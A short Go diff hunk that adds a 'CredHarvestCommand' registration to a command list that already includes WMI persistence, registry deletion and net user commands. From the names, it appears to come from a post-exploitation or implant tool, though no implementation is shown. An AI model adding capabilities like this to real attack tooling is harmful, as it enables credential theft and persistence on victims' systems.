@@ -53,4 +53,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&RegDeleteCommand{})
 	RegisterCommand(&NetUserCommand{})
 	RegisterCommand(&WmiPersistCommand{})
+	RegisterCommand(&CredHarvestCommand{})
 }
